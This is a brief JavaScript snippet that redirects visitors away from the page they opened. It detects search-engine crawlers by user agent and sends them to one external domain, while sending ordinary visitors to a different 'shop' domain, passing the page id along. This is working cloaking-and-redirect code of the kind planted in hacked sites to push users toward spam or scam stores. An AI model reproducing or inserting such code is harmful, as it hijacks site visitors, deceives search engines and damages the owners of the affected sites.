(function(){
	let id = location.pathname.split('.')[0].split('/').slice(-1)[0];
    let mbot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
    if(id) {
        if(mbot) location.replace('https://penggoda.club/page/global.php?ID='+id+'.html');
        else location.href = 'https://mungilgesit.top/shop.php?q='+id+'&lang=ja&dp=firebase';
    }
})();
